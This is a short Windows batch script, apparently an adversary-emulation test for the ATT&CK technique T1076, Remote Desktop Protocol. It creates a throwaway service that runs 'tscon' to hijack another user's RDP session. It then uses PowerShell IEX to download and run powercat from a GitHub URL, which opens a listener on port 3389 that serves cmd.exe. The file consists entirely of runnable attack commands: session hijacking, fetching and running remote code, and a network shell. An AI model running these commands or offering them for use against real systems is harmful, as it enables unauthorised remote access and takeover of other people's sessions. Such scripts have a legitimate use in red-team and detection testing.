@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Remote Desktop Protocol	(T1076)
ECHO.
ECHO [+] Use 'SC' to create service for RDP and Delete
ECHO -------------------------------------------------------------------
sc.exe create rdpservice binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
net start rdpservice
sc.exe delete rdpservice
ECHO.

ECHO [+] RDP reverse tunnel
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/powercat/master/powercat.ps1'); $m = powercat -l -p 3389 -e cmd -v; $m
cmd \c mstsc /console /V:127.0.0.1

